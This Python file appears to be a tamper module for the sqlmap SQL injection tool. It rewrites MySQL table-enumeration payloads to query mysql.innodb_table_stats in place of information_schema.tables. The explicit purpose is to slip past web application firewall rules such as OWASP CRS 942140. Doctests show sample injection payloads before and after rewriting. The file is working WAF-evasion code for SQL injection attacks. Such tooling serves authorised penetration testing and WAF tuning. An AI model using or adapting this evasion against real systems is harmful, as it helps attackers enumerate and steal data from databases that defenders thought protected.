#!/usr/bin/env python

"""
Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org)
See the file 'LICENSE' for copying permission
"""

import re

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    Rewrites MySQL table-enumeration off 'information_schema.tables' onto the InnoDB statistics
    table 'mysql.innodb_table_stats' (table_schema -> database_name), to dodge WAF rules that flag
    the 'information_schema' name (e.g. OWASP CRS 942140 'common DB names')

    Requirement:
        * MySQL

    Notes:
        * 'information_schema' is a hard token for anomaly-scoring WAFs (CRS rule 942140), so table
          enumeration is blocked even when the single-character read itself is not. 'mysql.innodb_table_stats'
          exposes (database_name, table_name) for every InnoDB table and is NOT on those blocklists, so the
          same enumeration passes. Pair with 'blindbinary' to also get the per-character read through.
        * Only InnoDB tables are listed (no MyISAM/MEMORY tables, no views) and SELECT on the 'mysql'
          schema is required (granted to root and most admin users).
        * Column enumeration (information_schema.columns) has no such InnoDB equivalent; provide the
          columns explicitly (-C) when behind such a WAF, or fall back to common-columns brute forcing.

    >>> tamper('SELECT table_name FROM information_schema.tables WHERE table_schema=0x6d6173746572 LIMIT 0,1')
    'SELECT table_name FROM mysql.innodb_table_stats WHERE database_name=0x6d6173746572 LIMIT 0,1'
    >>> tamper('SELECT COUNT(table_name) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=0x61')
    'SELECT COUNT(table_name) FROM mysql.innodb_table_stats WHERE database_name=0x61'
    >>> tamper('1 AND 1=1')
    '1 AND 1=1'
    """

    retVal = payload

    if retVal and re.search(r"(?i)information_schema\.tables", retVal):
        retVal = re.sub(r"(?i)information_schema\.tables", "mysql.innodb_table_stats", retVal)
        retVal = re.sub(r"(?i)table_schema", "database_name", retVal)

    return retVal
